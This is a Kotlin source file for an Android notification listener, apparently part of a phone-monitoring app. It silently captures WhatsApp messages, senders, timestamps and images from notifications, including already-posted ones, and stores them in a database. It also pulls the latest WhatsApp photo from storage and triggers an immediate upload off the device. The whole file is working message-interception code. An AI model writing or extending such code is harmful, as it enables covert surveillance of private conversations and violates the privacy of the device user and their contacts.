package com.spapp.monitoring.collectors

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Listens to incoming and active system notifications for messaging apps (e.g. WhatsApp & WhatsApp Business).
 * Captures chat messages with sender name, text, and timestamp in real-time
 * even when WhatsApp is running in the background.
 */
class WhatsAppNotificationListener : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onListenerConnected() {
        super.onListenerConnected()
        try {
            val activeNotifs = activeNotifications
            if (activeNotifs != null) {
                for (sbn in activeNotifs) {
                    processNotification(sbn)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read active notifications on listener connect", e)
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return
        processNotification(sbn)
    }

    private fun processNotification(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
        val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
        val text = if (!bigText.isNullOrBlank()) bigText else normalText
        val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
        // Extract exact real message timestamp from WhatsApp notification
        val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

        // Extract real image thumbnail if present in notification extras
        var mediaType: String? = null
        var mediaPath: String? = null

        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)

        if (pictureBitmap != null) {
            try {
                val stream = java.io.ByteArrayOutputStream()
                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, stream)
                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                mediaType = "image"
                mediaPath = "data:image/jpeg;base64,$base64"
            } catch (_: Exception) {}
        } else if (text?.contains("📷") == true || text?.contains("Photo", ignoreCase = true) == true) {
            mediaType = "image"
            try {
                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
            } catch (_: Exception) {}
        }

        // Determine chat name: conversation title (groups) > title > fallback
        val chatName = when {
            !convoTitle.isNullOrBlank() -> convoTitle
            !title.isNullOrBlank() && title != "WhatsApp" && title != "WhatsApp Business" -> title
            else -> title ?: "WhatsApp"
        }

        // Skip non-message service notifications
        val checkStr = "${title.orEmpty()} ${text.orEmpty()}".lowercase()
        if (checkStr.contains("checking for new messages") ||
            checkStr.contains("whatsapp web is active") ||
            checkStr.contains("backup in progress") ||
            checkStr.contains("deleting messages")
        ) {
            return
        }

        val entries = mutableListOf<WhatsAppMessageEntry>()

        // 1. InboxStyle / multi-message bundled notification lines
        if (!textLines.isNullOrEmpty()) {
            for (line in textLines) {
                val lineStr = line?.toString()?.trim() ?: continue
                if (lineStr.isBlank()) continue
                val colonIdx = lineStr.indexOf(':')
                val (sender, msg) = if (colonIdx > 0 && colonIdx < lineStr.length - 1) {
                    val s = lineStr.substring(0, colonIdx).trim()
                    val m = lineStr.substring(colonIdx + 1).trim()
                    Pair(s, m)
                } else {
                    Pair(title ?: chatName, lineStr)
                }
                entries += WhatsAppMessageEntry(
                    chatName = chatName,
                    sender = sender,
                    messageText = msg,
                    isOutgoing = false,
                    messageTimeEpochMs = postTime,
                    mediaType = mediaType,
                    mediaPath = mediaPath
                )
            }
        } else if (!text.isNullOrBlank() && !text.matches(Regex("^\\d+\\s+new messages?.*", RegexOption.IGNORE_CASE))) {
            entries += WhatsAppMessageEntry(
                chatName = chatName,
                sender = title ?: chatName,
                messageText = text,
                isOutgoing = false,
                messageTimeEpochMs = postTime,
                mediaType = mediaType,
                mediaPath = mediaPath
            )
        }

        if (entries.isNotEmpty()) {
            scope.launch {
                try {
                    val db = AppDatabase.getInstance(applicationContext)
                    db.whatsAppMessageDao().insertAll(entries)
                    RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to record WhatsApp notification message", e)
                }
            }
        }
    }

    companion object {
        private const val TAG = "WhatsAppNotification"
    }
}
